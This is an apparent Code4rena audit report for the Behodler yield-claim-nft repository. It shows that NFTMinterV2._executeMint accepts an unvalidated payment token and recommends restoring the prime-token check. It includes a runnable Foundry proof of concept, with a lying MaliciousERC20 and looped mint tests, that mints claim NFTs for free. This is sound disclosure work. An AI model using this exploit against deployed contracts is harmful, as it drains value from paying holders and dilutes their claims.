<!--
C4 Submission Metadata
Title: [H-01] Arbitrary free V2 NFT mint via fake ERC20 (primeToken check removed in NFTMinterV2._executeMint)
Severity: High
Root Cause Link: https://github.com/Behodler/yield-claim-nft/blob/master/src/V2/NFTMinterV2.sol#L166-L198
PoC File: test/poc-H-01.t.sol
-->

## Finding description and impact

### Summary

`NFTMinterV2._executeMint` accepts the payment `token` as a caller-supplied parameter and performs **no validation** that it matches the dispatcher's configured prime token. The in-source comment at [`NFTMinterV2.sol#L166`](https://github.com/Behodler/yield-claim-nft/blob/master/src/V2/NFTMinterV2.sol#L166) explicitly acknowledges this removal of V1's invariant:

> `// V2: No primeToken() validation — transfers whatever token the user specifies.`

Because the balance-before/after accounting is done on the attacker-controlled `token`, an attacker can substitute a malicious ERC20 that lies about balances and transfers, pay nothing, and still receive a V2 claim NFT.

### Vulnerability details

The vulnerable function at [`src/V2/NFTMinterV2.sol#L166-L198`](https://github.com/Behodler/yield-claim-nft/blob/master/src/V2/NFTMinterV2.sol#L166-L198):

```solidity
/// @dev Shared internal implementation for both mint() overloads.
/// V2: No primeToken() validation — transfers whatever token the user specifies.
function _executeMint(address token, uint256 index, address recipient, bytes memory extraData)
    internal
    returns (bool)
{
    require(!paused, "Contract is paused");
    DispatcherConfig storage config = configs[index];
    require(config.dispatcher != address(0), "NFTMinterV2: index not registered");
    require(!config.disabled, "NFTMinterV2: dispatcher is disabled");

    uint256 price = config.price;

    // Transfer tokens directly from user to dispatcher (balance-before/after for FOT safety)
    uint256 balanceBefore = IERC20(token).balanceOf(config.dispatcher);
    IERC20(token).transferFrom(msg.sender, config.dispatcher, price);
    uint256 actualReceived = IERC20(token).balanceOf(config.dispatcher) - balanceBefore;

    // Grow price: newPrice = oldPrice + (oldPrice * growthBasisPoints / 10000)
    config.price = price + (price * config.growthBasisPoints) / 10000;

    // Invoke the dispatcher with actual received amount (dispatch is on ATokenDispatcherV2 with whenNotPaused guard)
    ATokenDispatcherV2(config.dispatcher).dispatch(address(this), actualReceived, extraData);

    uint256 resolvedTokenId = index;

    // Mint 1 claim NFT to recipient
    _mint(recipient, resolvedTokenId, 1, "");

    emit ClaimMinted(recipient, index, token, price);

    return true;
}
```

Every payment-related call (`balanceOf`, `transferFrom`, second `balanceOf`) targets the attacker-controlled `token`. V1 guarded exactly this invariant with `require(ITokenDispatcher(config.dispatcher).primeToken() == token, ...)`; V2 removed it.

An attacker-authored ERC20 that returns `0` from `balanceOf` and `true` from `transferFrom` (without moving anything) causes:

- `balanceBefore = 0`
- `transferFrom` returns `true` (no real transfer)
- `balanceAfter = 0`
- `actualReceived = 0`

`actualReceived = 0` then propagates into the dispatcher:

- `GatherV2.dispatch(..., 0, ...)` performs a `safeTransfer` of `0` real prime tokens — valid no-op.
- `BurnerV2.dispatch(..., 0, ...)` calls `IBurnable(_token).burn(0)` — valid no-op.

Control returns to `_executeMint`, which unconditionally calls `_mint(recipient, resolvedTokenId, 1, "")`, issuing a real claim NFT. The attack can be repeated indefinitely with the same fake token.

### Impact

**High.** Any user can mint an arbitrary number of V2 claim NFTs without spending a single unit of the real prime token. Concretely:

- The claim-entitlement invariant of the protocol is broken: claim NFTs no longer represent paid prime-token deposits.
- Yield that V2 claim NFTs entitle holders to is diluted to effectively zero per legitimate holder, because an attacker can mint unbounded NFTs for free.
- The dispatcher's intended economic flow (prime token accrues to the Gather recipient / is burned by Burner) is completely bypassed.
- Legitimate users who paid real WBTC (or any other configured prime token) see their claim position arbitrarily diluted by a free-riding attacker.

This is a direct, unconditional exploit with no prerequisites beyond "a V2 dispatcher is registered," which is the normal deployment state.

### Attack path

1. Owner registers any V2 dispatcher (e.g., a `GatherV2` bound to real WBTC) via `registerDispatcher`.
2. Attacker deploys `MaliciousERC20` whose `balanceOf` returns `0` and whose `transferFrom` returns `true` without moving balances.
3. Attacker calls `NFTMinterV2.mint(maliciousToken, dispatcherIndex, attacker)`.
4. `_executeMint` computes `actualReceived = 0`, dispatcher performs a no-op on `0`, and `_mint` issues one NFT to the attacker.
5. Attacker repeats step 3 in a loop to mint as many free NFTs as desired.

The PoC (`test/poc-H-01.t.sol`) demonstrates both a single-mint and a 25-iteration loop variant; both pass, and in each case the attacker ends with the expected NFT balance while zero real WBTC moves anywhere.

## Recommended mitigation steps

Restore the V1 invariant that binds the caller-supplied `token` to the dispatcher's declared prime token. For example, in `_executeMint`:

```solidity
require(
    ITokenDispatcherV2(config.dispatcher).primeToken() == token,
    "NFTMinterV2: token mismatch"
);
```

If the V2 design intentionally allows multiple acceptable tokens per dispatcher, the safer refactor is to **remove the `token` parameter entirely** and have `_executeMint` read the authoritative token directly from the dispatcher:

```solidity
address token = ATokenDispatcherV2(config.dispatcher).primeToken();
uint256 balanceBefore = IERC20(token).balanceOf(config.dispatcher);
IERC20(token).transferFrom(msg.sender, config.dispatcher, price);
uint256 actualReceived = IERC20(token).balanceOf(config.dispatcher) - balanceBefore;
```

Either form eliminates the attacker's ability to supply an arbitrary token. Additionally, switching the `transferFrom` call to `SafeERC20.safeTransferFrom` is recommended so that ERC20s returning `false` (rather than reverting) cannot silently underpay — this is an orthogonal hardening, but relevant to the same trust boundary.

### Proof of Concept

A runnable Foundry PoC is provided at `test/poc-H-01.t.sol`. It contains two tests, both passing against the current codebase:

- `test_H01_FreeMintViaFakeToken` — single mint, zero real payment, one NFT received.
- `test_H01_LoopFreeMintsForFree` — 25 iterations, 25 NFTs received, zero real payment.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {NFTMinterV2} from "../src/V2/NFTMinterV2.sol";
import {GatherV2} from "../src/V2/dispatchers/GatherV2.sol";

/**
 * @title H-01 PoC: Arbitrary free V2 NFT mint via fake ERC20
 * @notice Demonstrates that V2 NFTMinterV2 no longer validates the caller-supplied
 *         `token` against the dispatcher's primeToken. Any user can mint claim NFTs
 *         for free by passing an attacker-controlled ERC20 whose balanceOf()
 *         always returns 0 and whose transferFrom() is a no-op.
 *
 * Vulnerability Location:
 *   src/V2/NFTMinterV2.sol:166-198  (_executeMint)
 *   Comment on L166: "V2: No primeToken() validation - transfers whatever token
 *                     the user specifies."
 */

/// @dev Simple ERC20 used as the GatherV2 dispatcher's real _token (stand-in for WBTC).
contract MockWBTC is ERC20 {
    constructor() ERC20("Wrapped BTC", "WBTC") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// @dev Attacker-controlled "ERC20" that lies to NFTMinterV2._executeMint:
///      - balanceOf always returns 0 (so before/after diff is 0)
///      - transferFrom always returns true without moving anything
contract MaliciousERC20 {
    string public name = "Fake WBTC";
    string public symbol = "fWBTC";
    uint8 public constant decimals = 8;

    function totalSupply() external pure returns (uint256) { return 0; }
    function balanceOf(address) external pure returns (uint256) { return 0; }
    function allowance(address, address) external pure returns (uint256) { return type(uint256).max; }
    function approve(address, uint256) external pure returns (bool) { return true; }
    function transfer(address, uint256) external pure returns (bool) { return true; }
    function transferFrom(address, address, uint256) external pure returns (bool) {
        // Lie: pretend the transfer succeeded without touching any balances.
        return true;
    }
}

contract H01PoCTest is Test {
    NFTMinterV2 internal minter;
    GatherV2 internal gather;
    MockWBTC internal wbtc;
    MaliciousERC20 internal fakeToken;

    address internal owner = address(this);
    address internal gatherRecipient = address(0xFEED);
    address internal attacker = makeAddr("attacker");

    uint256 internal constant PRICE = 1e18;
    uint256 internal dispatcherIndex;

    function setUp() public {
        minter = new NFTMinterV2(owner);
        wbtc = new MockWBTC();

        gather = new GatherV2(address(wbtc), gatherRecipient, owner);
        gather.setMinter(address(minter));

        minter.registerDispatcher(address(gather), PRICE, 0);
        dispatcherIndex = minter.dispatcherToIndex(address(gather));
        assertEq(dispatcherIndex, 1, "dispatcher should be registered at index 1");

        vm.prank(attacker);
        fakeToken = new MaliciousERC20();

        assertEq(wbtc.balanceOf(attacker), 0, "attacker starts with 0 WBTC");
        assertEq(wbtc.balanceOf(address(gather)), 0, "gather starts with 0 WBTC");
        assertEq(wbtc.balanceOf(gatherRecipient), 0, "recipient starts with 0 WBTC");
    }

    /// @notice Single-shot exploit: mint one claim NFT with zero real payment.
    function test_H01_FreeMintViaFakeToken() public {
        uint256 attackerWbtcBefore = wbtc.balanceOf(attacker);
        uint256 gatherWbtcBefore = wbtc.balanceOf(address(gather));
        uint256 recipientWbtcBefore = wbtc.balanceOf(gatherRecipient);
        uint256 attackerNftsBefore = minter.balanceOf(attacker, dispatcherIndex);
        assertEq(attackerWbtcBefore, 0, "pre: attacker holds 0 WBTC");
        assertEq(attackerNftsBefore, 0, "pre: attacker holds 0 claim NFTs");

        // === EXPLOIT ===
        vm.prank(attacker);
        bool ok = minter.mint(address(fakeToken), dispatcherIndex, attacker);
        assertTrue(ok, "mint should return true");

        uint256 attackerWbtcAfter = wbtc.balanceOf(attacker);
        uint256 gatherWbtcAfter = wbtc.balanceOf(address(gather));
        uint256 recipientWbtcAfter = wbtc.balanceOf(gatherRecipient);
        uint256 attackerNftsAfter = minter.balanceOf(attacker, dispatcherIndex);

        assertEq(attackerNftsAfter, 1, "attacker should own 1 V2 claim NFT");
        assertEq(attackerWbtcAfter, 0, "attacker still holds 0 WBTC");
        assertEq(gatherWbtcAfter, 0, "gather received 0 real WBTC");
        assertEq(recipientWbtcAfter, 0, "recipient received 0 real WBTC");
    }

    /// @notice Loop the attack to demonstrate unlimited free mints.
    function test_H01_LoopFreeMintsForFree() public {
        uint256 N = 25;

        for (uint256 i = 0; i < N; i++) {
            vm.prank(attacker);
            bool ok = minter.mint(address(fakeToken), dispatcherIndex, attacker);
            assertTrue(ok, "mint should return true");
        }

        uint256 nftsMinted = minter.balanceOf(attacker, dispatcherIndex);
        uint256 gatherReceived = wbtc.balanceOf(address(gather));
        uint256 recipientReceived = wbtc.balanceOf(gatherRecipient);

        assertEq(nftsMinted, N, "attacker should have minted N NFTs");
        assertEq(wbtc.balanceOf(attacker), 0, "attacker still holds 0 WBTC");
        assertEq(gatherReceived, 0, "gather still holds 0 real WBTC");
        assertEq(recipientReceived, 0, "recipient still holds 0 real WBTC");
    }
}
```

Run with:

```
forge test --match-contract H01PoCTest -vv
```

Both tests pass, confirming that a zero-cost mint is achievable today and that the exploit is trivially loopable.
